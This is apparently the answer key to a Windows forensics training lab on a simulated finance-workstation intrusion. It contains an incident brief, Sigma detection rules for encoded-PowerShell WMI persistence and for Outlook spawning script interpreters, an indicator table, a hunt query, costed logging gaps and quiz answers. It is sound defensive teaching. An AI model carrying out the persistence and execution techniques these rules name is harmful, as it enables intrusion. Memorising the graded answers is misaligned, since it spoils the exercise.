# Incident Brief — Finance Workstation Compromise        Ref: IR-2024-11-014
As of: 2024-11-17 09:00 UTC | Status: Contained
Prepared by: A. Reyes, Incident Response | Classification: Confidential — Internal
Distribution: CFO, CIO, General Counsel, IR Manager

## Bottom line
The incident is contained and has not spread. Three days of monitoring have found no
further attacker activity anywhere in the environment. The finance file server was
reached but its files were not read. One question remains genuinely open and is
likely to stay open: we cannot determine what was inside the encrypted traffic that
left the affected workstation.

## What we know
- The attacker's program was searched for across every managed computer in the
  company and found on none. The external address it contacted appears in our
  network records for only the two affected machines.
- The finance file server was reached and its folder structure was listed, but no
  files were read from it. That is now established from the server's own records.
- The unidentified computer has been found: an unmanaged machine in a decommissioned
  lab space, connected to our network for about eighteen months without ever being
  inventoried. It has been removed from the network and will not return.
- Both hidden mechanisms were removed. The affected workstation is being rebuilt from
  a clean image rather than cleaned.
- Passwords and access keys for every account that could have been exposed have been
  changed.

## What we do not know yet
- What was contained in the roughly 180 kilobytes sent to the external address, and
  in the 4 megabytes copied to the unmanaged machine. Neither is likely to become
  answerable; the first was encrypted and unrecorded, and the second machine kept no
  logs. We are treating this as a permanent limitation rather than a pending answer.
- How the attacker first got in. We have narrowed this to a document opened on the
  workstation but have not confirmed how it arrived. Expected answer by 21 November.

## Business impact
No service outage occurred. The finance share was unavailable for 14 minutes on the
evening of 14 November. One user is on a replacement machine. Payroll and customer
pricing data on the file server were not read; data held on the workstation itself
cannot be ruled out. No customer or employee notification obligation has been
identified on the evidence to date — this remains General Counsel's determination.

## Actions taken
| When (UTC) | Action | By |
|---|---|---|
| 14 Nov 18:05 | Evidence copy taken of the finance file server; server contained | IR |
| 14 Nov 18:20 | Affected workstation isolated from the network | IR |
| 14 Nov 18:25 | Password and access-key changes begun | Identity |
| 15 Nov 11:40 | Unmanaged machine located and removed from the network | Network + IR |
| 16 Nov 16:00 | Environment-wide search completed; no further affected systems | IR |

## Decisions needed from leadership
1. Funding for the three logging changes identified by this incident — needed by
   28 November — because the same gaps will produce the same unanswerable questions
   in the next incident, and the detail behind the request is freshest now.
2. Confirmation that the post-incident review is scheduled with a Finance
   representative present — needed by 21 November — because two of the four
   improvement actions require a Finance owner and will not otherwise be adopted.

## Next update: 2024-11-21 09:00 UTC, or immediately on any change in status
```

**1. What the page limit cut.**
The initial-access chain. The 14 November brief never says the intrusion started with a document opened in Outlook. At 17:45 that was Probable rather than Confirmed, and explaining a Probable initial-access vector in plain language takes three sentences the page does not have. The cut did not change what the CFO decides: neither of her two decisions turns on how the attacker got in. It would have changed a *third* decision, if there were one: whether to send a company-wide phishing warning. Note that in the covering email, even though it is not on the page.

**2. Did the plain-language version quietly upgrade?**
Most drafts fail here, and the sentence to interrogate is the one about payroll data. "Payroll and customer pricing data are held on the file server and are therefore in question; whether either was accessed is under assessment" is honest. It names the category as *in question* because of where the data lives, not because of anything the evidence shows, and it explicitly labels the access question as unresolved. Compare that with a very common draft: "we have no evidence that payroll data was accessed." It is technically true and reads as reassurance. It is the plain-language equivalent of the unqualified negative in §13.2.4 Example 3. The Task 3 Undetermined finding says a named set of sources would have answered this and none was available. The brief must carry that same shape, and "under assessment" is how it carries it.

The 17 November version does upgrade one thing, correctly. "The finance file server was reached but its files were not read" is now supported by destination-side logs and is a Confirmed finding, so plain language may state it plainly.

**3. Good news and cadence.**
§13.1.3 warns that readers always interpret silence from the IR team, and never charitably. The trap around good news is that a team with nothing new to report stops reporting. The reader interprets that as either "they've lost interest" or "they've found something they're not telling me." The second brief avoids the trap in two ways. It sets a next update date even though the incident is contained and nothing is pressing. It also converts the remaining unknown from a pending answer into a stated permanent limitation. Writing "we are treating this as a permanent limitation rather than a pending answer" stops the CFO from waiting three weeks for a resolution that is never coming, and then discovering that it was never coming.

---

## Task 13 — Close the Loop

### Part A — Two Sigma rules

**Rule 1 — the persistence mechanism.**

```yaml
title: WMI CommandLineEventConsumer With Encoded PowerShell
id: 2b6f4c11-9d3a-4e07-b5c8-71a0f9e32d64
status: experimental
description: >
  Detects creation of a WMI CommandLineEventConsumer whose command line invokes
  PowerShell with an -EncodedCommand argument. Observed as the second of two
  persistence mechanisms in IR-2024-11-014, created four seconds after a scheduled
  task carrying the identical payload.
references:
  - Internal case IR-2024-11-014
  - https://attack.mitre.org/techniques/T1546/003/
logsource:
  product: windows
  service: wmi
detection:
  selection:
    EventID:
      - 5861   # Microsoft-Windows-WMI-Activity/Operational — consumer registration
    Operation|contains: 'CommandLineEventConsumer'
  encoded:
    Operation|contains:
      - '-EncodedCommand'
      - '-enc '
      - '-WindowStyle Hidden'
  condition: selection and encoded
falsepositives:
  - Management and monitoring agents that register CommandLineEventConsumers.
    Baseline first — this environment has three benign consumers (SCM Event Log
    Consumer, SmsMonitoringConsumer, TimerConsumer1), none of which invokes
    PowerShell. Allow-list by consumer name and binary path, not by namespace.
level: high
```

*What would have made it fire:* the `wmi-persistence.csv` row for `WindowsUpdateConsumer`, at 2024-11-14 14:23:02 UTC — 4 seconds after the scheduled task, and 42 seconds before the attacker deleted `update.exe`. On a host with Sysmon deployed, Sysmon EID 20 (`WmiEventConsumer`) and EID 21 (`WmiEventConsumerToFilter`) give the same detection with better fields. See `Book/AppendixC.md`.

**Rule 2 — earlier in the chain.**

```yaml
title: PowerShell Spawned by Outlook
id: 8e3f1c02-5b7a-4d19-9a44-2c6e91f0b7d3
status: experimental
description: >
  Detects powershell.exe created with outlook.exe as parent. Observed as the initial
  execution step in IR-2024-11-014, 43 seconds after a document was opened from the
  user's Documents folder and 4 seconds before the download cradle connected out.
references:
  - Internal case IR-2024-11-014
  - https://attack.mitre.org/techniques/T1566/001/
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    ParentImage|endswith: '\outlook.exe'
    Image|endswith:
      - '\powershell.exe'
      - '\pwsh.exe'
      - '\cmd.exe'
      - '\wscript.exe'
      - '\cscript.exe'
      - '\mshta.exe'
      - '\rundll32.exe'
  condition: selection
falsepositives:
  - Office add-ins that shell out. None observed in this environment; validate
    against 30 days of process telemetry before deploying at this severity.
level: high
```

*What would have made it fire:* the EID 4688 in `security-evtx.csv` at 2024-11-14 14:19:38 UTC. This rule generalizes beyond the observed case. The attacker used PowerShell, but the detection is worth nothing if it only catches PowerShell. Widening the child-process list turns a case-specific rule into a durable one.

### Part B — The harvest

| Category | Items | Where it goes | Shelf life |
|---|---|---|---|
| Atomic indicators | SHA-256 `4f8b2c1a…12345`; SHA-1 `a1b2c3d4…abcd`; `91.214.47.22`; the URI path `/h/u.t`; `185.193.126.47`; task name `WindowsUpdateSync`; WMI names `WindowsUpdateFilter` / `WindowsUpdateConsumer` | Perimeter blocklist, EDR IOC list, SIEM retro-hunt over the full retention window | Days to weeks. The attacker changes them. Do it anyway — it costs minutes. |
| Behavioral detections | Rules 1 and 2 above. Plus: a user-authored scheduled task created inside a `\Microsoft\Windows\` task path — the `Author` field on `WindowsUpdateSync` is the tell and it is a strong, low-noise signal | SIEM and EDR, tagged `IR-2024-11-014` | Years. This is where the value is. |
| Hunt-pack entries | Generalize the shape, not the instance: *outbound connections from user-context processes to external addresses first observed in the last N days, where the process image sits under a user profile path* — that finds this C2 and the next one. Second entry: *scheduled tasks and WMI consumers whose creation timestamp falls inside a known incident window on any host* | The Lab 09 hunt pack, new section, cross-referenced to this case | Long, if written as shapes |
| Detection gaps (had the log, no rule) | PowerShell Script Block Logging was enabled and captured the download cradle in full at 14:19:38 — and no rule watched it. The 14:21 EDR alert came from the process chain, not the script block, so the SIEM had nothing to raise. A 4104 containing `Invoke-WebRequest` to a bare IP address is a rule that should have existed. Likewise 4688 with `-EncodedCommand`. | Detection engineering tickets, one per gap, each referencing the 4104 record it would have fired on | — |
| Logging gaps (no log at all) | See Part C | The incident report, Section 5, and the funding request | The highest-value output of the whole exercise |

**Hunt-pack entry, generalized:**

```markdown
### H-14 — First-seen external destination from a user-profile process

**Origin:** IR-2024-11-014 (WKSTN-221, 2024-11-14)
**Question it answers:** Is a process running from a user-writable path talking to
an external address this environment has not seen before?
**Why it generalizes:** The C2 address in the originating case is dead. The shape —
a binary in `\AppData\Local\Temp\` or `\AppData\Roaming\` opening an outbound
session to an address absent from the preceding 30 days of flow data — is what
recurs. In the originating case it would first have matched at 14:21:48, when
`update.exe` in `Temp\` opened its first C2 session, 45 seconds after it executed.
The earlier 14:19:42 session came from `powershell.exe` in `System32` and does not
match the path filter. Build the 30-day baseline from the days before the hunt
window, or that earlier session hides the address from this one.

**Logic (pseudo):**
  network_connections
  | where process_path matches '\\Users\\.*\\AppData\\'
  | where destination_ip is external
  | join kind=leftanti (flow_summary | where timestamp > ago(30d)) on destination_ip
  | summarize bytes_out, bytes_in by process, destination_ip, first_seen

**Read the direction.** Report `bytes_out` and `bytes_in` as separate columns. In
the originating case the total volume looked like exfiltration and the direction
did not. Any output of this hunt that collapses the two into one figure is
misleading by construction.

**Known noise:** Software updaters and installers running from Temp; telemetry
agents; browser-managed helper processes. Baseline by process name, not by path.
**Tuning notes:** ______________________
**Last reviewed:** ______________________
```

### Part C — Costed logging gaps

> **Gap L-1:** No memory acquisition capability is deployed to physical endpoints. The first memory capture on WKSTN-221 was taken at 17:35 UTC on 2024-11-14, approximately three hours after attacker activity ceased, and only because a responder carried a tool to the desk. The 14:25 decision to collect before isolating therefore had no quick way to finish, and the host stayed on the network until 18:20. Finding 11 (credential exposure) is Undetermined as a direct result. The credential rotation in Section 6 was performed on a precautionary basis rather than an evidentiary one, at a cost of two service outages. **Change:** deploy a memory acquisition capability to the EDR agent's response tooling, so that a responder can start a memory image remotely on any managed endpoint within five minutes of a containment decision. Add "capture memory" as a required, timestamped step in the containment runbook. **Owner:** Security Engineering, with IR. **Cost:** licensing for the EDR live-response module (already owned; not enabled), one week of engineering time to package and test the capture tool, and roughly 400 GB of staging storage on the response share.

> **Gap L-2:** The workstation triage collection profile enumerates five persistence locations (Run/RunOnce, Services, Scheduled Tasks, WMI `root\subscription`, Winlogon). It does not enumerate COM hijacks, IFEO debuggers, AppInit/AppCert DLLs, LSA/SSP providers, Office add-ins and templates, BITS jobs, accessibility-tool replacements, netsh helper DLLs, or non-default WMI namespaces. Eradication question 1 ("have all persistence mechanisms been identified?") is therefore **Possible** rather than Probable for every host this profile is used on. The retained host FILESVR-03 carries that residual risk indefinitely. **Change:** extend the triage collection profile to cover all 15 locations in the persistence checklist in Section 6.1 (Eradication verification). Add the corresponding parser output to the standard analysis pack. **Owner:** IR Tooling. **Cost:** two days to extend and test the collection profile; approximately 40 MB additional collection size per host; no licensing.

> **Gap L-3:** The Security event log on workstations is capped at 20 MB and rolls over in approximately 36 hours on WKSTN-221. No Windows Event Forwarding is configured, so no copy of any host's Security log exists off that host. Finding 1's boundary clause ("activity before 2024-11-13 cannot be assessed from the host") and Finding 6 (lateral movement: Undetermined) are both direct consequences. The four failed authentications from 185.193.126.47 at 04:00 UTC on 14 November could not be placed in a longer pattern. **Change:** increase the Security log to 512 MB on workstations and 1 GB on servers, and enable Windows Event Forwarding for the 4624 / 4625 / 4648 / 4672 / 4688 / 4698 / 4720 / 1102 subset to a collector with 180-day retention. **Owner:** Platform Engineering, with SOC for collector capacity. **Cost:** configuration change via GPO (no licence); one additional WEF collector, sized at approximately 2 TB for 180 days at current endpoint count; roughly three days of engineering to build and validate the subscription.

*A fourth, worth writing even though the lab asked for three:* the 18-month gap between a host joining the domain and anyone noticing it is an asset-management gap, not a logging gap. It produced the single largest unknown in this incident, though, and it belongs in the same list because it is the same kind of finding: a specific condition, a specific consequence, a specific owner, a specific cost. Write it as **Gap A-1** and give it to whoever owns the CMDB.

### Part D — Lessons learned

| Question | Answer | Action | Owner | Due |
|---|---|---|---|---|
| What let this happen? | Office applications on the workstation fleet are able to spawn script interpreters, and there is no attack-surface-reduction rule blocking it. The 14:19:38 `OUTLOOK.EXE` → `POWERSHELL.EXE` spawn was the whole intrusion in one event. | Enable the ASR rule blocking Office applications from creating child processes, in audit mode across the fleet for 14 days, then in block mode | Endpoint Engineering | 2024-12-05 |
| What delayed detection? | Little did. The EDR alert on the `OUTLOOK.EXE` → `POWERSHELL.EXE` chain fired at 14:21, under 2 minutes after the 14:19:38 spawn, and the SOC escalated at 14:23. The weakness is depth, not speed. Only one platform alerted. Script Block Logging captured the download cradle at 14:19:38, and no SIEM rule watched it. | Deploy Sigma rules 1 and 2 (Task 13 Part A) plus a 4104 rule for `Invoke-WebRequest` to a bare IP address, so a second platform alerts on the same chain. Target: SIEM alert within 60 seconds of the process-creation event | Detection Engineering | 2024-11-28 |
| What slowed the response? | Containment. At 14:25, two minutes after escalation, IR decided to monitor and collect before isolating. The decision set no time limit and named no event that would trigger isolation. The attacker kept working. The scheduled task was created at 14:22:58 and the WMI subscription at 14:23:02, as the escalation landed. `update.exe` was deleted at 14:23:44, `10.0.4.17` logged on at 14:31:05, the explicit-credential logon to FILESVR-03 came at 14:33:18, and the `10.0.4.17` session logged off at 14:38:00. The lateral move came 10 minutes after IR engaged, and nothing in the decision required anyone to act on it. WKSTN-221 was isolated at 18:20, almost four hours after the decision. Three gaps stretched that window. No memory capture capability was on hand (Gap L-1), so the "collect" half of the decision could not finish quickly. No EDR on servers removed the fastest containment and collection path for FILESVR-03. And `10.0.4.17` had no CMDB record, so locating it took until 11:40 on 15 November. | (a) Change the containment runbook so every monitor-before-isolate decision records a time limit of no more than 30 minutes and named isolation triggers: a new internal logon to or from the host, explicit-credential use, or new persistence. (b) Gap L-1. (c) Business case for extending EDR to the server estate, with this incident as the evidence. (d) Quarterly reconciliation of DHCP leases and AD computer accounts against the CMDB, with unmatched entries as exceptions requiring an owner. | (a) IR (b) Security Engineering (c) CISO (d) IT Asset Management | (a) 2024-11-24 (b) 2024-12-13 (c) 2024-12-20 (d) first run 2024-12-31 |
| What worked, and is it repeatable? | Three things. The EDR alert fired in under 2 minutes and the SOC escalated 2 minutes later, so IR was engaged while the attacker was still on the host. PowerShell Script Block Logging was already enabled fleet-wide, and it is the single reason the download cradle, the decode step, and the rename to `update.exe` are Confirmed rather than inferred. Without 4104, the whole initial-access finding drops to Possible. And the hypervisor snapshot of FILESVR-03 contained the host and captured its memory and disk in one action, for a 14-minute outage, on a server with no EDR agent. | (a) Add the alert-to-escalation interval to the SOC's monthly metrics, so a slowdown shows up before the next incident does. (b) Add Script Block Logging coverage to the monthly control-verification report so a GPO regression is caught in weeks rather than during an incident. (c) Add "if the host is a VM you control, snapshot first" as the first branch of the containment runbook's decision tree, above the EDR isolation step, with the FILESVR-03 record as the worked example. | (a) SOC (b) Platform Engineering (c) IR | (a) 2024-11-30 (b) 2024-11-30 (c) 2024-11-24 |

**1. Time to detect.**
First attacker action: 14:19:38, the `OUTLOOK.EXE` → `POWERSHELL.EXE` spawn. If you count the LNK creation it is 14:18:55, so say which you counted. First alert: 14:21. Counted from 14:19:38, that is **under 2 minutes** to alert and under 4 minutes to a human at the 14:23 escalation. Counted from 14:18:55, it is about 2 and 4 minutes. Detection was fast, and the report should say so. Little would shorten it much. Rule 2 and a 4104 rule in the SIEM add a second platform that alerts on the same chain, which matters more than the seconds they might save. That is a detection gap, not a logging gap, so it is cheap to close: the data was already there and already retained. The interval that cost this case came after detection. The lateral move to FILESVR-03 at 14:33:18 came 10 minutes after escalation, while the 14:25 decision kept WKSTN-221 online, and isolation came at 18:20. Put the improvement effort there.

**2. What worked, made repeatable.**
Script Block Logging. Someone who is no longer on the team enabled it before this incident, and nobody currently knows why or when. That is the fragile part. An unowned control is one GPO refactor away from disappearing, and nobody would notice its absence until the next incident produced a report full of Possible where this one has Confirmed. The action is not "keep Script Block Logging enabled" — that is an aspiration. It is "add the control to the monthly verification report with a named owner," which converts it into something whose failure is detected in weeks.

**3. Retirement criterion.**
For Rule 1 (WMI `CommandLineEventConsumer` with encoded PowerShell): **do not retire it.** Write that down as the criterion, with the reason. The rule targets a technique (T1546.003) rather than a campaign, its false-positive profile is near zero in a baselined environment, and the tooling that uses the technique long outlives any single attacker. The retirement condition is a change in the environment, not a change in the threat. Retire it only if the organization adopts a management platform that legitimately registers PowerShell-invoking WMI consumers at volume. Even then, the correct action is an allow-list by consumer name and binary path rather than removal.

For Rule 2 (PowerShell spawned by Outlook), the criterion is different. Retire or downgrade it if the ASR rule from the lessons-learned table reaches block mode fleet-wide and holds for 90 days. At that point the behaviour is prevented rather than detected, and the rule becomes an alert on a control failure rather than on an intrusion. That alert is still worth having, but at `level: medium` and routed to Endpoint Engineering rather than to the SOC queue. Reviewed by: Detection Engineering, annually, referencing `IR-2024-11-014`.

---

## Ready-to-move-on self-check

Before you close the book, confirm you can answer these five cold. If any feel wobbly, revisit the relevant task.

1. **You have one number: 2,415,891 bytes associated with a compromised host and an external IP. What is the first thing you check before writing a single word about it?**
   *Answer:* The direction. Which column is it in, `BytesSent` or `BytesReceived`, and from whose perspective is the row written? A byte count without a direction supports no finding about data movement at all. Reading one in the wrong direction is how a report ends up claiming exfiltration when the evidence shows a download. Check the second, independent source before writing, too. In this case SRUM and perimeter flow agreed to the byte, which made the finding Confirmed rather than Probable.

2. **State the four confidence levels and the one rule about Undetermined that analysts most often break.**
   *Answer:* Confirmed (two or more independent sources agreeing, or one authoritative source with no plausible alternative); Probable (single reliable source, no contradiction, benign explanation would require an unlikely coincidence); Possible (evidence equally consistent with at least one plausible alternative you can state); Undetermined (evidence neither supports nor refutes). The broken rule: **Undetermined is a finding, not a blank.** It goes in the report with the named source that would have answered it and the reason that source was unavailable. Omitting the row implies you looked and found nothing, which is a stronger claim than the evidence supports.

3. **A live compromised Windows host is a VM on a hypervisor your team controls. What is the first containment action, and why is it the answer almost every time?**
   *Answer:* Suspend and snapshot at the hypervisor. It is the one containment action with essentially no evidence cost. It preserves a complete memory image and disk state atomically, in a single operation, while stopping the host. Responders routinely forget it because they reach for the EDR console by reflex. It is doubly valuable on incidents where no memory image exists for any host.

4. **Your host was compromised at user context, one commodity binary was found and deleted, one persistence mechanism was found and understood, and dwell time is a few hours. Clean or rebuild — and what is the actual deciding factor?**
   *Answer:* Rebuild, unless the eighth factor is Confirmed. The deciding factor is confidence in scope, not the severity of what you found. Cleaning is an assessment made against the attacker techniques you know about. Rebuilding from a trusted image is an assessment that does not depend on the completeness of your investigation at all. When scope confidence is Probable rather than Confirmed, rebuilding is how you stop your uncertainty from becoming the organization's risk. Rebuild is the default. Cleaning is the exception that requires a written justification naming what you checked.

5. **The incident is closed. What is the single highest-value artifact the case should leave behind, and what makes the difference between it being funded and being ignored?**
   *Answer:* The logging gaps, written as specific costed changes. Every Undetermined finding in the report points at a source that was unavailable. That list is a work plan the organization will still benefit from in three years. The difference between funded and ignored is whether each gap is tied to the specific finding it would have resolved. "We should enable Windows Event Forwarding" is a best practice and will not be funded. "The Security log is capped at 20 MB and wraps in 36 hours on WKSTN-221; Finding 6 is Undetermined and Finding 1 cannot look before 2024-11-13 as a direct result; change to 512 MB plus WEF for this event subset; owner Platform Engineering; cost one collector at 2 TB" is a budget line. The window in which the organization will act on it closes fast, and the incident report is the moment.

---

*Lab 13 has no Hands-On Walkthrough. There is no backing dataset to walk through, because the lab consumes the output of Labs 04, 09, 10, and 11 rather than raw artifacts. Every evidential figure quoted in this key is verified against `Data/WKSTN-221/`, `Data/network/`, and `Data/HR-WS17/`. The lab scenario supplies the response-side timestamps (alert, escalation, containment), and they do not appear in the datasets.*

---

*Part of the [Windows Forensics for Beginners](https://github.com/zach115th/Windows-Forensics-for-Beginners) lab series.*
